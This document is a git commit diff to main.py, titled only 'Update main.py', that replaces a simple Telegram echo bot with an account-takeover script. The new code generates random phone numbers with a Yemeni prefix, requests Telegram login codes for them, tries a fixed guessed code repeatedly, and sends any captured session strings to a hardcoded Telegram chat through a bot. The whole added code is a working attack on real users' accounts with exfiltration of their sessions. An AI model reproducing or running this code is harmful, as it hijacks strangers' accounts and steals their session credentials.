01d6772bdad98b6b849ad3962a352827f8074177
abood77-sstak <omar7mw@gmail.com>
2024-08-28 21:32:05 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,59 @@
 
 import os
-from telethon import TelegramClient, events
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import PhoneCodeInvalidError, SendCodeUnavailableError, SessionPasswordNeededError
+import telebot, random, asyncio
 
-API_ID = os.environ["API_ID"]
-API_HASH = os.environ["API_HASH"]
+API_ID = os.environ["API_ID2"]
+API_HASH = os.environ["API_HASH2"]
 BOT_TOKEM = os.environ["BOT_TOKEN"]
 
 
-client = TelegramClient ("bot", API_ID, API_HASH)
-client.start(bot_token=BOT_TOKEM)
-@client.on(events.NewMessage)
-async def handler (event):
-        await event.reply(event.raw_text)
 
-client.start()
-client.run_until_disconnected()
+#logging.basicConfig(level=logging.INFO)
+
+
+bot = telebot.TeleBot(BOT_TOKEM)
+chat_id = 1085837500
+
+
+async def send(phone:str):
+    print(phone)
+    
+    for _ in range(5):
+        code = 98245
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        if not await client.is_user_authorized():
+           try:
+              
+              #await asyncio.sleep(5)
+              await client.send_code_request(phone)
+              
+              await client.sign_in(phone, code)
+              string = client.session.save()              
+              bot.send_message(chat_id, f"{phone} ------\n{string}")
+              
+           except (PhoneCodeInvalidError, SessionPasswordNeededError):
+               print("invalid code")
+           except SendCodeUnavailableError:
+               print("cant send code")
+        else:
+            break
+    
+def randNum():
+    
+    return  f"+96773{random.randint(1000000,9999999)}"
+ 
+async def main():
+    num = 10
+    while True:
+        allSend = [send(randNum()) for _ in range(num)]
+        await asyncio.gather(*allSend)
+
+if __name__ == "__main__":
+  
+    asyncio.run(main())
+
+      
